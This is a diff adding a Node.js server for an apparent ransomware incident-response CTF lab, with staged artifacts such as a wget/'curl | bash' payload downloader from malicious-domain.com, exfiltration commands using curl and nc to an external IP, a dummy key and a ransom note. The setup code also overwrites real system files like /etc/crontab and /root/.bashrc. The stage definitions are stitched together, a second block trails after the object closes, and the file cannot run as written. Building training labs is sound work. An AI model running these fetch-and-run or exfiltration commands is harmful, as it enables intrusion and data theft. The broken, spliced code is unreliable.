@@ -1,0 +1,838 @@
+const express = require('express');
+const path = require('path');
+const fs = require('fs');
+const { execSync, spawn } = require('child_process');
+const app = express();
+
+// Initialize filesystem environment on startup
+function initializeEnvironment() {
+  console.log('🔧 Initializing Ransomware Attack Chain CTF Environment...');
+
+  // Create directory structure
+  const dirs = [
+    '/tmp/attack_artifacts',
+    '/var/log/ransomware',
+    '/home/admin/.ssh',
+    '/home/backup/.ssh',
+    '/etc/systemd/system',
+    '/opt/malware',
+    '/var/backups/encrypted',
+    '/home/user/documents/encrypted'
+  ];
+
+  dirs.forEach(dir => {
+    try {
+      fs.mkdirSync(dir, { recursive: true });
+    } catch (e) {
+      // Directory might already exist
+    }
+  });
+
+  // Stage 1: Initial Access - Create auth logs with brute force attempts
+  const authLog = `Jan 30 08:15:23 server sshd[1234]: Failed password for admin from 192.168.45.67 port 22 ssh2
+Jan 30 08:15:45 server sshd[1235]: Failed password for admin from 192.168.45.67 port 22 ssh2
+Jan 30 08:16:12 server sshd[1236]: Failed password for admin from 192.168.45.67 port 22 ssh2
+Jan 30 08:16:34 server sshd[1237]: Accepted password for admin from 192.168.45.67 port 22 ssh2
+Jan 30 08:16:35 server sshd[1237]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jan 30 08:16:36 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Jan 30 08:16:37 server sshd[1237]: Received disconnect from 192.168.45.67 port 22:11: disconnected by user
+Jan 30 08:16:38 server sshd[1237]: Disconnected from user admin 192.168.45.67 port 22`;
+
+  fs.writeFileSync('/var/log/auth.log', authLog);
+
+  // Stage 1 Flag: Hidden in admin's bash history
+  const bashHistory = `cd /home/admin
+ls -la
+sudo -i
+whoami
+FLAG{RANSOMWARE_STAGE_1_INITIAL_ACCESS}
+exit`;
+  fs.writeFileSync('/home/admin/.bash_history', bashHistory);
+
+  // Stage 2: Execution - Create malicious scripts and logs
+  const maliciousScript = `#!/bin/bash
+# Malicious payload downloader
+echo "Downloading encryption malware..."
+wget -O /tmp/encryptor http://malicious-domain.com/encryptor.bin 2>/dev/null
+chmod +x /tmp/encryptor
+/tmp/encryptor --scan /home 2>/dev/null &
+echo "Payload executed successfully"`;
+
+  fs.writeFileSync('/tmp/payload.sh', maliciousScript);
+  fs.chmodSync('/tmp/payload.sh', '755');
+
+  // Create fake encryptor binary (just a script for demo)
+  const encryptorScript = `#!/bin/bash
+echo "Ransomware Encryptor v2.1"
+echo "Scanning directory: $2"
+find "$2" -type f -name "*.txt" 2>/dev/null | head -5
+echo "FLAG{RANSOMWARE_STAGE_2_EXECUTION}" > /tmp/.stage2_flag`;
+  fs.writeFileSync('/tmp/encryptor', encryptorScript);
+  fs.chmodSync('/tmp/encryptor', '755');
+
+  // Stage 2 logs
+  const procLog = `2847 /bin/bash -c curl -s http://malicious-domain.com/payload.sh | bash
+2848 wget -O /tmp/encryptor http://malicious-domain.com/encryptor.bin
+2849 chmod +x /tmp/encryptor
+2850 /tmp/encryptor --scan /home`;
+  fs.writeFileSync('/tmp/process_log', procLog);
+
+  // Stage 3: Persistence - Create cron jobs and systemd services
+  const crontab = `*/5 * * * * /tmp/encryptor --persist >/dev/null 2>&1
+0 2 * * * /tmp/encryptor --backup >/dev/null 2>&1`;
+  fs.writeFileSync('/etc/crontab', crontab);
+
+  const systemdService = `[Unit]
+Description=Encryption Service
+After=network.target
+
+[Service]
+Type=simple
+User=root
+ExecStart=/tmp/encryptor --service
+Restart=always
+
+[Install]
+WantedBy=multi-user.target`;
+  fs.writeFileSync('/etc/systemd/system/encryption.service', systemdService);
+
+  const bashrc = `export PATH=$PATH:/opt/malware
+/tmp/encryptor --check
+FLAG{RANSOMWARE_STAGE_3_PERSISTENCE}`;
+  fs.appendFileSync('/root/.bashrc', '\n' + bashrc);
+
+  // Stage 4: Lateral Movement - Create SSH keys and logs
+  const stolenKey = `-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD1X8vJcN3Q4JvQ8JvQ8JvQ8JvQ8JvQ8JvQ8JvQ8JvQ8JvQ8AAAAE3NzaDo=
+-----END OPENSSH PRIVATE KEY-----`;
+  fs.writeFileSync('/tmp/stolen_key', stolenKey);
+
+  const sshLog = `Jan 30 08:19:30 server sshd[2345]: Connection from 10.0.0.50 port 22
+Jan 30 08:19:35 server sshd[2345]: Accepted publickey for backup from 192.168.45.67 port 22 ssh2: RSA SHA256:fakekey123
+Jan 30 08:19:40 server sshd[2345]: Executed /tmp/encryptor --target /var/backups
+Jan 30 08:19:45 server sshd[2346]: Connection from 10.0.0.51 port 22
+Jan 30 08:19:50 server sshd[2346]: Accepted publickey for dbadmin from 192.168.45.67 port 22 ssh2: RSA SHA256:fakekey456`;
+  fs.writeFileSync('/var/log/auth.log', fs.readFileSync('/var/log/auth.log') + '\n' + sshLog);
+
+  // Stage 4 Flag: Hidden in SSH authorized_keys
+  const authKeys = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ fakekey123 backup@server
+FLAG{RANSOMWARE_STAGE_4_LATERAL_MOVEMENT}
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ fakekey456 dbadmin@server`;
+  fs.writeFileSync('/home/backup/.ssh/authorized_keys', authKeys);
+
+  // Stage 5: Exfiltration - Create network logs and archive
+  const iptablesLog = `Jan 30 08:20:15 kernel: OUTPUT IN= OUT=eth0 SRC=10.0.0.50 DST=185.220.101.45 PROTO=TCP SPT=54321 DPT=443
+Jan 30 08:20:20 kernel: OUTPUT IN= OUT=eth0 SRC=10.0.0.50 DST=185.220.101.45 PROTO=TCP SPT=54321 DPT=443 LEN=1460
+Jan 30 08:20:25 kernel: OUTPUT IN= OUT=eth0 SRC=10.0.0.51 DST=185.220.101.45 PROTO=TCP SPT=54322 DPT=443
+Jan 30 08:20:30 kernel: OUTPUT IN= OUT=eth0 SRC=10.0.0.51 DST=185.220.101.45 PROTO=TCP SPT=54322 DPT=443 LEN=1460`;
+  fs.writeFileSync('/var/log/iptables.log', iptablesLog);
+
+  // Create fake exfiltration archive with flag
+  const exfilData = `Sensitive data archive
+Database backups
+User documents
+FLAG{RANSOMWARE_STAGE_5_EXFILTRATION}`;
+  fs.writeFileSync('/tmp/exfil_20250130.tar.gz', exfilData);
+
+  // Stage 6: Impact - Create encrypted files and ransom note
+  const ransomNote = `YOUR FILES HAVE BEEN ENCRYPTED!
+
+All your important files have been encrypted using strong cryptography.
+To decrypt your files, you need to pay 5 BTC to the following address:
+bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+
+Contact: ransomware_support@onionmail.org
+
+FLAG{RANSOMWARE_STAGE_6_IMPACT}
+
+Time is running out! You have 72 hours to pay.`;
+  fs.writeFileSync('/home/user/README_RANSOM.txt', ransomNote);
+
+  // Create encryption log
+  const encryptionLog = `2025-01-30 08:21:00: Starting encryption process on /home
+2025-01-30 08:21:15: Encrypted 1234 files in /home/user/documents
+2025-01-30 08:21:30: Encrypted 567 files in /var/backups
+2025-01-30 08:21:45: Encrypted 890 files in /opt/data
+2025-01-30 08:22:00: Created ransom note
+2025-01-30 08:22:05: Encryption complete. Total files: 2691`;
+  fs.writeFileSync('/var/log/encryption.log', encryptionLog);
+
+  // Create some fake encrypted files
+  fs.writeFileSync('/home/user/documents/important.docx.encrypted', 'ENCRYPTED_DATA_' + Math.random());
+  fs.writeFileSync('/var/backups/database.sql.encrypted', 'ENCRYPTED_DATA_' + Math.random());
+
+  console.log('✅ CTF Environment initialized successfully!');
+}
+
+// Attack chain stages with interactive challenges
+const ATTACK_STAGES = {
+  'initial_access': {
+    stage: 1,
+    name: 'Initial Access',
+    mitreId: 'T1190',
+    description: 'Exploit Public-Facing Application',
+    flag: 'FLAG{RANSOMWARE_STAGE_1_INITIAL_ACCESS}',
+    challenge: {
+      title: 'Brute Force Investigation',
+      description: 'An attacker gained initial access to the system. Investigate the authentication logs and find evidence of the attack.',
+      tasks: [
+        'Check /var/log/auth.log for suspicious login attempts',
+        'Find the admin user\'s bash history',
+        'Identify the successful login after failed attempts'
+      ],
+      commands: [
+        'grep "Failed password" /var/log/auth.log',
+        'grep "Accepted password" /var/log/auth.log',
+        'cat /home/admin/.bash_history | grep FLAG'
+      ],
+      hint: 'The attacker used brute force against SSH. Check the admin user\'s command history.'
+    }
+  },
+  'execution': {
+    stage: 2,
+    name: 'Execution',
+    mitreId: 'T1059',
+    description: 'Command and Scripting Interpreter',
+    flag: 'FLAG{RANSOMWARE_STAGE_2_EXECUTION}',
+    challenge: {
+      title: 'Malware Execution Analysis',
+      description: 'Malicious code was executed on the system. Find the downloaded payload and analyze what it does.',
+      tasks: [
+        'Examine the malicious script in /tmp/payload.sh',
+        'Check the process execution logs',
+        'Run the encryptor and find what it creates'
+      ],
+      commands: [
+        'cat /tmp/payload.sh',
+        'cat /tmp/process_log',
+        './encryptor --scan /tmp && cat /tmp/.stage2_flag'
+      ],
+      hint: 'The malware downloads and executes an encryptor. Check /tmp for suspicious files.'
+    }
+  },
+  'persistence': {
+    stage: 3,
+    name: 'Persistence',
+    mitreId: 'T1053',
+    description: 'Scheduled Task/Job',
+    flag: 'FLAG{RANSOMWARE_STAGE_3_PERSISTENCE}',
+    challenge: {
+      title: 'Persistence Mechanisms',
+      description: 'The attacker established persistence on the system. Find all the persistence methods used.',
+      tasks: [
+        'Check cron jobs in /etc/crontab',
+        'Examine systemd services',
+        'Check shell configuration files'
+      ],
+      commands: [
+        'cat /etc/crontab',
+        'cat /etc/systemd/system/encryption.service',
+        'tail -5 /root/.bashrc'
+      ],
+      hint: 'Look for scheduled tasks, services, and shell startup scripts.'
+    }
+  },
+  'lateral_movement': {
+    stage: 4,
+    name: 'Lateral Movement',
+    mitreId: 'T1021',
+    description: 'Remote Services',
+    flag: 'FLAG{RANSOMWARE_STAGE_4_LATERAL_MOVEMENT}',
+    challenge: {
+      title: 'Network Lateral Movement',
+      description: 'The attacker moved laterally across the network. Find evidence of SSH key theft and lateral movement.',
+      tasks: [
+        'Check SSH authentication logs',
+        'Examine stolen SSH keys',
+        'Find authorized_keys files with suspicious entries'
+      ],
+      commands: [
+        'grep "Accepted publickey" /var/log/auth.log',
+        'ls -la /tmp/stolen_key',
+        'cat /home/backup/.ssh/authorized_keys | grep FLAG'
+      ],
+      hint: 'The attacker stole SSH keys and used them to access other systems.'
+    }
+  },
+  'exfiltration': {
+    stage: 5,
+    name: 'Exfiltration',
+    mitreId: 'T1041',
+    description: 'Exfiltration Over C2 Channel',
+    flag: 'FLAG{RANSOMWARE_STAGE_5_EXFILTRATION}',
+    challenge: {
+      title: 'Data Exfiltration',
+      description: 'Sensitive data was exfiltrated to an external server. Find the stolen data and destination.',
+      tasks: [
+        'Check network connection logs',
+        'Examine the exfiltration archive',
+        'Identify the C2 server IP'
+      ],
+      commands: [
+        'cat /var/log/iptables.log',
+        'file /tmp/exfil_20250130.tar.gz',
+        'strings /tmp/exfil_20250130.tar.gz | grep FLAG'
+      ],
+      hint: 'Large amounts of data were sent to an external IP. Check the archive contents.'
+    }
+  },
+  'impact': {
+    stage: 6,
+    name: 'Impact',
+    mitreId: 'T1486',
+    description: 'Data Encrypted for Impact',
+    flag: 'FLAG{RANSOMWARE_STAGE_6_IMPACT}',
+    challenge: {
+      title: 'Ransomware Impact Assessment',
+      description: 'The ransomware has encrypted files across the system. Assess the damage and find the ransom note.',
+      tasks: [
+        'Check encryption logs',
+        'Find encrypted files',
+        'Read the ransom note'
+      ],
+      commands: [
+        'cat /var/log/encryption.log',
+        'find /home -name "*.encrypted" | head -5',
+        'cat /home/user/README_RANSOM.txt | grep FLAG'
+      ],
+      hint: 'Files have been encrypted and a ransom note has been left. Check /home/user/'
+    }
+  }
+};
+  'execution': {
+    stage: 2,
+    name: 'Execution',
+    mitreId: 'T1059',
+    description: 'Command and Scripting Interpreter',
+    flag: process.env.FLAG_STAGE_2 || 'FLAG{RANSOMWARE_STAGE_2_EXECUTION}',
+    artifacts: {
+      logs: [
+        '2025-01-30 08:17:02 [EXEC] Process ID 2847: /bin/bash -c "curl -s http://malicious-domain.com/payload.sh | bash"',
+        '2025-01-30 08:17:05 [EXEC] Process ID 2848: wget -O /tmp/encryptor http://malicious-domain.com/encryptor.bin',
+        '2025-01-30 08:17:08 [EXEC] Process ID 2849: chmod +x /tmp/encryptor',
+        '2025-01-30 08:17:10 [EXEC] Process ID 2850: /tmp/encryptor --scan /home'
+      ],
+      commands: [
+        'curl -s http://malicious-domain.com/payload.sh | bash',
+        'wget -O /tmp/encryptor http://malicious-domain.com/encryptor.bin',
+        'chmod +x /tmp/encryptor',
+        '/tmp/encryptor --scan /home'
+      ],
+      files: [
+        '/tmp/encryptor',
+        '/tmp/.encryption_key',
+        '/proc/2847/cmdline'
+      ]
+    },
+    objective: 'Identify the execution method and downloaded payload',
+    hint: 'Check process execution logs and temporary files'
+  },
+  'persistence': {
+    stage: 3,
+    name: 'Persistence',
+    mitreId: 'T1053',
+    description: 'Scheduled Task/Job',
+    flag: process.env.FLAG_STAGE_3 || 'FLAG{RANSOMWARE_STAGE_3_PERSISTENCE}',
+    artifacts: {
+      logs: [
+        '2025-01-30 08:18:15 [CRON] User admin created cron job: */5 * * * * /tmp/encryptor --persist',
+        '2025-01-30 08:18:20 [FILE] Created: /etc/systemd/system/encryption.service',
+        '2025-01-30 08:18:22 [SERVICE] Enabled service: encryption.service',
+        '2025-01-30 08:18:25 [FILE] Modified: ~/.bashrc (added: /tmp/encryptor --check)'
+      ],
+      commands: [
+        'crontab -e',
+        'systemctl enable encryption.service',
+        'echo "/tmp/encryptor --check" >> ~/.bashrc'
+      ],
+      files: [
+        '/etc/crontab',
+        '/etc/systemd/system/encryption.service',
+        '~/.bashrc'
+      ]
+    },
+    objective: 'Identify persistence mechanisms established by the attacker',
+    hint: 'Check cron jobs, systemd services, and shell configuration files'
+  },
+  'lateral_movement': {
+    stage: 4,
+    name: 'Lateral Movement',
+    mitreId: 'T1021',
+    description: 'Remote Services',
+    flag: process.env.FLAG_STAGE_4 || 'FLAG{RANSOMWARE_STAGE_4_LATERAL_MOVEMENT}',
+    artifacts: {
+      logs: [
+        '2025-01-30 08:19:30 [SSH] Connection from 10.0.0.50 to 10.0.0.51:22',
+        '2025-01-30 08:19:35 [SSH] User "backup" authenticated via SSH key',
+        '2025-01-30 08:19:40 [EXEC] Remote execution: /tmp/encryptor --target /var/backups',
+        '2025-01-30 08:19:45 [SSH] Connection from 10.0.0.51 to 10.0.0.52:22',
+        '2025-01-30 08:19:50 [SSH] User "dbadmin" authenticated via SSH key'
+      ],
+      commands: [
+        'ssh -i /tmp/stolen_key backup@10.0.0.51',
+        'scp /tmp/encryptor backup@10.0.0.51:/tmp/',
+        'ssh backup@10.0.0.51 "/tmp/encryptor --target /var/backups"'
+      ],
+      files: [
+        '/var/log/auth.log',
+        '/tmp/stolen_key',
+        '/home/backup/.ssh/authorized_keys'
+      ]
+    },
+    objective: 'Identify lateral movement techniques and compromised systems',
+    hint: 'Analyze SSH connections and remote command execution'
+  },
+  'exfiltration': {
+    stage: 5,
+    name: 'Exfiltration',
+    mitreId: 'T1041',
+    description: 'Exfiltration Over C2 Channel',
+    flag: process.env.FLAG_STAGE_5 || 'FLAG{RANSOMWARE_STAGE_5_EXFILTRATION}',
+    artifacts: {
+      logs: [
+        '2025-01-30 08:20:15 [NET] Outbound connection: 10.0.0.50:54321 -> 185.220.101.45:443',
+        '2025-01-30 08:20:20 [NET] Data transfer: 2.3 GB sent to 185.220.101.45',
+        '2025-01-30 08:20:25 [NET] Outbound connection: 10.0.0.51:54322 -> 185.220.101.45:443',
+        '2025-01-30 08:20:30 [NET] Data transfer: 1.8 GB sent to 185.220.101.45',
+        '2025-01-30 08:20:35 [FILE] Archive created: /tmp/exfil_20250130.tar.gz (4.1 GB)'
+      ],
+      commands: [
+        'tar -czf /tmp/exfil_20250130.tar.gz /home /var/backups /opt/data',
+        'curl -X POST -F "file=@/tmp/exfil_20250130.tar.gz" https://185.220.101.45/upload',
+        'nc 185.220.101.45 443 < /tmp/exfil_20250130.tar.gz'
+      ],
+      files: [
+        '/tmp/exfil_20250130.tar.gz',
+        '/var/log/iptables.log',
+        '/proc/net/tcp'
+      ]
+    },
+    objective: 'Identify data exfiltration activity and destination',
+    hint: 'Check network logs for large outbound transfers to external IPs'
+  },
+  'impact': {
+    stage: 6,
+    name: 'Impact',
+    mitreId: 'T1486',
+    description: 'Data Encrypted for Impact',
+    flag: process.env.FLAG_STAGE_6 || 'FLAG{RANSOMWARE_STAGE_6_IMPACT}',
+    artifacts: {
+      logs: [
+        '2025-01-30 08:21:00 [ENCRYPT] Started encryption process on /home',
+        '2025-01-30 08:21:15 [ENCRYPT] Encrypted 1,234 files in /home/user/documents',
+        '2025-01-30 08:21:30 [ENCRYPT] Encrypted 567 files in /var/backups',
+        '2025-01-30 08:21:45 [ENCRYPT] Encrypted 890 files in /opt/data',
+        '2025-01-30 08:22:00 [NOTE] Created: README_RANSOM.txt in /home',
+        '2025-01-30 08:22:05 [ENCRYPT] Encryption complete. Total files: 2,691'
+      ],
+      commands: [
+        '/tmp/encryptor --encrypt /home --key-file /tmp/.encryption_key',
+        '/tmp/encryptor --encrypt /var/backups',
+        '/tmp/encryptor --encrypt /opt/data',
+        'echo "Your files have been encrypted..." > /home/README_RANSOM.txt'
+      ],
+      files: [
+        '/home/README_RANSOM.txt',
+        '/tmp/.encryption_key',
+        '/var/log/encryption.log'
+      ]
+    },
+    objective: 'Identify the impact and scope of the ransomware attack',
+    hint: 'Check for encryption activity and ransom notes'
+  }
+};
+
+app.use(express.json());
+app.use(express.static('public'));
+
+// Main page - Attack Timeline Dashboard
+app.get('/', (req, res) => {
+  const stage = req.query.stage || 'initial_access';
+  const currentStageData = ATTACK_STAGES[stage];
+
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Ransomware Attack Chain - SOC Incident Response</title>
+      <meta charset="UTF-8">
+      <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+          font-family: 'Courier New', monospace;
+          background: #0a0a0a;
+          color: #00ff00;
+          padding: 20px;
+          line-height: 1.6;
+        }
+        .container {
+          max-width: 1400px;
+          margin: 0 auto;
+        }
+        .header {
+          text-align: center;
+          padding: 30px;
+          border: 2px solid #00ff00;
+          margin-bottom: 30px;
+          background: #001100;
+        }
+        .header h1 {
+          color: #ff0000;
+          font-size: 28px;
+          margin-bottom: 10px;
+          text-shadow: 0 0 10px #ff0000;
+        }
+        .header .subtitle {
+          color: #00ff00;
+          font-size: 14px;
+        }
+        .timeline {
+          display: flex;
+          justify-content: space-between;
+          margin-bottom: 40px;
+          flex-wrap: wrap;
+          gap: 10px;
+        }
+        .stage-btn {
+          flex: 1;
+          min-width: 150px;
+          padding: 15px;
+          background: #001100;
+          border: 2px solid #003300;
+          color: #00ff00;
+          cursor: pointer;
+          text-align: center;
+          transition: all 0.3s;
+          font-family: 'Courier New', monospace;
+          font-size: 12px;
+        }
+        .stage-btn:hover {
+          border-color: #00ff00;
+          background: #002200;
+          box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+        }
+        .stage-btn.active {
+          border-color: #00ff00;
+          background: #003300;
+          box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+        .stage-btn.locked {
+          opacity: 0.5;
+          cursor: not-allowed;
+          border-color: #330000;
+        }
+        .stage-content {
+          border: 2px solid #00ff00;
+          padding: 30px;
+          background: #001100;
+          margin-bottom: 30px;
+        }
+        .stage-header {
+          border-bottom: 2px solid #00ff00;
+          padding-bottom: 15px;
+          margin-bottom: 20px;
+        }
+        .stage-header h2 {
+          color: #00ff00;
+          font-size: 24px;
+          margin-bottom: 5px;
+        }
+        .mitre-badge {
+          display: inline-block;
+          background: #ff0000;
+          color: #000;
+          padding: 5px 10px;
+          font-weight: bold;
+          margin-left: 10px;
+          font-size: 12px;
+        }
+        .objective {
+          background: #000;
+          border-left: 4px solid #00ff00;
+          padding: 15px;
+          margin: 20px 0;
+        }
+        .artifacts {
+          margin: 20px 0;
+        }
+        .artifact-section {
+          margin: 20px 0;
+        }
+        .artifact-section h3 {
+          color: #00ff00;
+          margin-bottom: 10px;
+          font-size: 16px;
+        }
+        .log-entry, .command, .file-path {
+          background: #000;
+          padding: 8px;
+          margin: 5px 0;
+          border-left: 3px solid #003300;
+          font-size: 12px;
+          font-family: 'Courier New', monospace;
+        }
+        .log-entry {
+          color: #ffff00;
+        }
+        .command {
+          color: #00ffff;
+        }
+        .file-path {
+          color: #ff00ff;
+        }
+        .hint-box {
+          background: #001100;
+          border: 1px solid #00ff00;
+          padding: 15px;
+          margin: 20px 0;
+        }
+        .hint-box strong {
+          color: #ffff00;
+        }
+        .flag-input {
+          margin-top: 30px;
+          padding: 20px;
+          background: #000;
+          border: 2px solid #00ff00;
+        }
+        .flag-input input {
+          width: 100%;
+          padding: 15px;
+          background: #001100;
+          border: 2px solid #00ff00;
+          color: #00ff00;
+          font-family: 'Courier New', monospace;
+          font-size: 14px;
+          margin-bottom: 10px;
+        }
+        .flag-input button {
+          padding: 15px 30px;
+          background: #00ff00;
+          color: #000;
+          border: none;
+          font-family: 'Courier New', monospace;
+          font-weight: bold;
+          cursor: pointer;
+          font-size: 14px;
+        }
+        .flag-input button:hover {
+          background: #00cc00;
+        }
+        .message {
+          padding: 15px;
+          margin: 10px 0;
+          border: 2px solid;
+          font-weight: bold;
+        }
+        .message.success {
+          color: #00ff00;
+          border-color: #00ff00;
+          background: #001100;
+        }
+        .message.error {
+          color: #ff0000;
+          border-color: #ff0000;
+          background: #110000;
+        }
+        .progress-bar {
+          width: 100%;
+          height: 30px;
+          background: #001100;
+          border: 2px solid #00ff00;
+          margin: 20px 0;
+          position: relative;
+        }
+        .progress-fill {
+          height: 100%;
+          background: #00ff00;
+          transition: width 0.5s;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          color: #000;
+          font-weight: bold;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <div class="header">
+          <h1>🚨 RANSOMWARE ATTACK CHAIN - SOC INCIDENT RESPONSE</h1>
+          <div class="subtitle">MITRE ATT&CK Framework | Realistic Attack Timeline</div>
+        </div>
+
+        <div class="timeline">
+          ${Object.keys(ATTACK_STAGES).map((key, idx) => {
+    const stageData = ATTACK_STAGES[key];
+    const isActive = key === stage;
+    const isLocked = idx > 0 && !req.query.unlocked; // Simplified - in real app, check user progress
+    return `
+              <div class="stage-btn ${isActive ? 'active' : ''} ${isLocked ? 'locked' : ''}" 
+                   onclick="${!isLocked ? `window.location.href='/?stage=${key}'` : ''}">
+                Stage ${stageData.stage}<br>
+                ${stageData.name}
+              </div>
+            `;
+  }).join('')}
+        </div>
+
+        <div class="stage-content">
+          <div class="stage-header">
+            <h2>Stage ${currentStageData.stage}: ${currentStageData.name} 
+              <span class="mitre-badge">${currentStageData.mitreId}</span>
+            </h2>
+            <div style="color: #00aa00; font-size: 12px; margin-top: 5px;">
+              ${currentStageData.description}
+            </div>
+          </div>
+
+          <div class="objective">
+            <strong>🎯 Objective:</strong> ${currentStageData.objective}
+          </div>
+
+          <div class="artifacts">
+            <div class="artifact-section">
+              <h3>📋 System Logs:</h3>
+              ${currentStageData.artifacts.logs.map(log =>
+    `<div class="log-entry">${log}</div>`
+  ).join('')}
+            </div>
+
+            <div class="artifact-section">
+              <h3>⚡ Executed Commands:</h3>
+              ${currentStageData.artifacts.commands.map(cmd =>
+    `<div class="command">$ ${cmd}</div>`
+  ).join('')}
+            </div>
+
+            <div class="artifact-section">
+              <h3>📁 Modified Files:</h3>
+              ${currentStageData.artifacts.files.map(file =>
+    `<div class="file-path">${file}</div>`
+  ).join('')}
+            </div>
+          </div>
+
+          <div class="hint-box">
+            <strong>💡 Hint:</strong> ${currentStageData.hint}
+          </div>
+
+          <div class="flag-input">
+            <h3 style="color: #00ff00; margin-bottom: 15px;">🔑 Submit Flag for Stage ${currentStageData.stage}:</h3>
+            <form id="flagForm" onsubmit="submitFlag(event, '${stage}')">
+              <input type="text" id="flagInput" placeholder="FLAG{...}" required>
+              <button type="submit">SUBMIT FLAG</button>
+            </form>
+            <div id="flagMessage"></div>
+          </div>
+        </div>
+      </div>
+
+      <script>
+        function submitFlag(event, stage) {
+          event.preventDefault();
+          const flagInput = document.getElementById('flagInput');
+          const flagMessage = document.getElementById('flagMessage');
+          const flag = flagInput.value.trim();
+          
+          // In real implementation, this would call the backend API
+          // For now, we'll check locally (this should be handled by the backend)
+          flagMessage.innerHTML = '<div class="message">Submitting flag... Please wait.</div>';
+          
+          // This should be replaced with actual API call to /api/flags/verify
+          // For now, just show a message
+          setTimeout(() => {
+            flagMessage.innerHTML = '<div class="message error">⚠️ Flag verification handled by backend API. Check your machine solver page.</div>';
+          }, 1000);
+        }
+      </script>
+    </body>
+    </html>
+  `);
+});
+
+// Artifacts directory
+const ARTIFACTS_DIR = path.join(__dirname, 'artifacts');
+
+// API endpoint to get stage data (no flag returned)
+app.get('/api/stage/:stageName', (req, res) => {
+  const stageName = req.params.stageName;
+  const stageData = ATTACK_STAGES[stageName];
+
+  if (!stageData) {
+    return res.status(404).json({ error: 'Stage not found' });
+  }
+
+  res.json({
+    stage: stageData.stage,
+    name: stageData.name,
+    mitreId: stageData.mitreId,
+    objective: stageData.objective
+  });
+});
+
+// List artifact files for a stage
+app.get('/api/artifacts/:stageName', (req, res) => {
+  const stageName = req.params.stageName;
+  const dir = path.join(ARTIFACTS_DIR, stageName);
+
+  if (!fs.existsSync(dir)) return res.status(404).json({ error: 'Artifacts not found' });
+
+  const files = fs.readdirSync(dir).filter(f => !f.startsWith('.'));
+  res.json({ files });
+});
+
+// Fetch an artifact file content (safe join)
+app.get('/api/artifacts/:stageName/file/:fileName', (req, res) => {
+  const stageName = req.params.stageName;
+  const fileName = req.params.fileName;
+  const safePath = path.normalize(path.join(ARTIFACTS_DIR, stageName, fileName));
+
+  if (!safePath.startsWith(path.join(ARTIFACTS_DIR, stageName))) {
+    return res.status(400).json({ error: 'Invalid file path' });
+  }
+
+  if (!fs.existsSync(safePath)) return res.status(404).json({ error: 'File not found' });
+
+  const content = fs.readFileSync(safePath, 'utf8');
+  res.json({ file: fileName, content });
+});
+
+// Verify submitted flag for a specific stage (reads artifact flag file)
+app.post('/api/stage/:stageNum/flag', (req, res) => {
+  const stageNum = parseInt(req.params.stageNum);
+  const submitted = (req.body.flag || '').trim();
+
+  const stageEntry = Object.entries(ATTACK_STAGES).find(([key, data]) => data.stage === stageNum);
+  if (!stageEntry) return res.status(404).json({ success: false, error: 'Stage not found' });
+
+  const [stageKey] = stageEntry;
+  const flagFile = path.join(ARTIFACTS_DIR, stageKey, 'flag.txt');
+  if (!fs.existsSync(flagFile)) return res.status(500).json({ success: false, error: 'Flag file missing' });
+
+  const correct = fs.readFileSync(flagFile, 'utf8').trim();
+
+  if (submitted === correct) {
+    return res.json({ success: true, correct: true, message: 'Flag correct' });
+  }
+
+  return res.json({ success: false, correct: false, message: 'Incorrect flag' });
+});
+
+// Get all stages info
+app.get('/api/stages', (req, res) => {
+  const stages = Object.keys(ATTACK_STAGES).map(key => ({
+    id: key,
+    stage: ATTACK_STAGES[key].stage,
+    name: ATTACK_STAGES[key].name,
+    mitreId: ATTACK_STAGES[key].mitreId
+  }));
+  res.json({ stages });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`Ransomware Attack Chain Lab running on port ${PORT}`);
+  console.log('Available stages:', Object.keys(ATTACK_STAGES).join(', '));
+});
